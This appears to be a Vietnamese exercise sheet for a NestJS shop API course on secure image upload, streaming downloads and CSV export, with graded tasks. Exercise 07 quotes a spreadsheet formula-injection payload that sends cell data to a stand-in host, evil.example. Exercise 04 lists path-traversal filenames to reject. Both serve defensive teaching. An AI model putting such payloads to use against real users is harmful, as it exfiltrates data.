# C12 · Bài tập

Tiếp tục `shop-api` sau C11. Cài: `npm i -D @types/multer`. Chấm: `bash lessons/check.sh lessons/C12-upload-streaming NN|all`. Bộ chấm dựng ứng dụng với **thư mục upload tạm** (thay token `UPLOAD_DIR`) và đếm file trên đĩa, nên tên token và vị trí file phải đúng như dưới đây.

Quy ước chung: mọi lỗi là problem+json (C06); route ghi/nhạy cảm dùng `@AdminOnly()`; `ProductsService.findOne` ném `ProductNotFoundError` khi không có sản phẩm.

**Pass:** 7/8 bài, ≤ 2 hint.

---

## 🟢 Cơ bản

### ex01 · Tải ảnh lên và tải về
`src/uploads/` (module `UploadsModule`, import vào `AppModule`):
- `POST /v1/products/:id/image` (`@AdminOnly`, `multipart/form-data`, trường **`file`**) → `201`, `Location: /v1/products/:id/image`, thân `{ productId, imageUrl, contentType, size }` (không có tên file của client).
- `GET /v1/products/:id/image` (công khai) trả đúng từng byte bằng `StreamableFile`, `Content-Type` đúng, `Content-Length` đúng.
- `DELETE /v1/products/:id/image` (`@AdminOnly`) → `204`; chưa có ảnh → `404`.
- Sản phẩm không tồn tại hoặc chưa có ảnh → `404` (kiểm tra sản phẩm **trước** khi ghi gì). Không gửi file hoặc sai tên trường → `400`. `id` sai → `400`.

### ex02 · Giới hạn kích thước
- Tối đa **2 MB** (`2 * 1024 * 1024`): đúng 2 MB được nhận, 2 MB + 1 byte → `413 payload-too-large` (problem+json). Đặt giới hạn ở Multer (`limits.fileSize`) để file lớn bị cắt giữa chừng; 6 MB và 12 MB đều `413` và server vẫn phục vụ tiếp.
- File rỗng (0 byte) → `4xx` (`400` hoặc `415`), không lưu.
- Lỗi không để lại file nào trên đĩa.

---

## 🟡 Kết hợp

### ex03 · Kiểm kiểu theo nội dung
- `src/uploads/image-magic-bytes.validator.ts` export `detectImageType(buffer): 'image/jpeg' | 'image/png' | 'image/webp' | undefined` và `ImageMagicBytesValidator` (kế thừa `FileValidator`, `isValid(file)` dựa **chỉ** trên `file.buffer`).
- Chỉ nhận JPEG (`FF D8 FF`), PNG (8 byte chữ ký), WebP (`RIFF` + 4 byte + `WEBP`). Quá ngắn, `RIFF....WAVE`, GIF, PDF, SVG, file thực thi → từ chối.
- Qua HTTP: nội dung không phải ảnh → `415 unsupported-media-type` dù client khai `image/png` và đuôi `.png`; ảnh hợp lệ được nhận dù client khai `application/pdf`/`.pdf`. `contentType` trong phản hồi và khi tải về lấy theo **nội dung**.

### ex04 · Lưu trữ an toàn
- `src/uploads/upload.tokens.ts` export `UPLOAD_DIR` (Symbol, chuỗi đường dẫn); mặc định nằm trong thư mục tạm của hệ điều hành (`os.tmpdir()`), không trong mã nguồn. `UploadsModule` cung cấp bằng `useValue`.
- Tên file trên đĩa do server đặt (ví dụ `<productId>.<ext>`), không bao giờ dùng tên client (`../../etc/passwd.png`, `..\\..\\x.png`, tên 300 ký tự...).
- Thay ảnh: mỗi sản phẩm chỉ còn **một** file, kể cả khi đổi định dạng PNG→JPEG; tải về cho nội dung mới. Xóa ảnh xóa luôn file.
- Upload thất bại (404, 415, 413, 401) không để lại file nào. Upload song song nhiều sản phẩm không lẫn nội dung.

### ex05 · Tải xuống bằng `StreamableFile`
- Header: `Content-Type`, `Content-Length` (kích thước thật), `ETag`, `Content-Disposition: inline`, `X-Content-Type-Options: nosniff`.
- Ảnh gần 2 MB trả về nguyên vẹn từng byte. `If-None-Match` khớp `ETag` → `304` không body; thay ảnh thì `ETag` đổi.
- Lỗi vẫn là problem+json.

### ex06 · Xuất CSV bằng stream
`GET /v1/exports/products.csv` (`@AdminOnly`):
- `Content-Type: text/csv; charset=utf-8`, `Content-Disposition: attachment; filename="products-YYYYMMDD.csv"` (ngày theo `ClockService`), phản hồi **chunked** (không có `Content-Length`).
- Nội dung: BOM `﻿`, dòng tiêu đề `id,sku,name,brand,price,stock,isActive,createdAt`, dòng kết thúc `\r\n`, theo thứ tự `id`, **mọi** sản phẩm kể cả `isActive=false`; `brand=null` là ô rỗng.
- Sinh bằng `Readable.from(asyncGenerator)` đọc từng trang (tối đa 100 dòng) từ `ProductsService.findAll`, không dựng cả file trong RAM. Có `@Timeout` riêng đủ lớn. 2500 sản phẩm → đúng 2500 dòng dữ liệu.

---

## 🔴 Thực tế

### ex07 · "Kế toán mở CSV bằng Excel, máy bị chạy lệnh"
Một khách đặt tên hàng `=HYPERLINK("http://evil.example/?x="&A1,"Bấm vào")`; kế toán mở file xuất và dữ liệu cột A bị gửi ra ngoài.
- `src/uploads/csv.ts` export `csvCell(value)` và `csvLine(values)` (kết thúc `\r\n`).
- Ô là **chuỗi** bắt đầu bằng `=`, `+`, `-`, `@`, tab hoặc CR được thêm dấu `'` đứng trước (rồi mới áp dụng quy tắc bao nháy). **Số** (kể cả âm) không bị đụng.
- Ô chứa `,`, `"`, xuống dòng, hoặc khoảng trắng đầu/cuối → bao trong `"..."`, nháy kép nhân đôi. `null`/`undefined` → rỗng. Tiếng Việt có dấu nguyên vẹn.
- Áp dụng trong file xuất (tên, hãng bắt đầu bằng `=`/`@`/`+` đều được vô hiệu hóa; tên có dấu phẩy/nháy/xuống dòng không làm lệch cột).

### ex08 · "Pentest: gửi 500 file trong một request"
- Chỉ nhận **một** file ở trường `file`, không trường văn bản nào: nhiều file, file ở trường khác, kèm `role=admin` → `400` (problem+json), không lưu gì. Gửi JSON thay vì multipart → `400`, không `500`.
- 20 upload song song 2 MB đều thành công; thân 12 MB bị cắt `413` và server sống.

---

> 📏 Câu hỏi (không chấm): xuất CSV 1 triệu sản phẩm bằng stream dùng khoảng bao nhiêu RAM so với dựng cả chuỗi rồi `res.send`? Dự đoán, rồi đo bằng `process.memoryUsage().rss` trước/sau và `monitorEventLoopDelay` (N01) khi nhiều người cùng xuất. Với repository in-memory, phần nào của bài này *thực sự* streaming, và B04 sẽ làm gì để nó streaming thật?
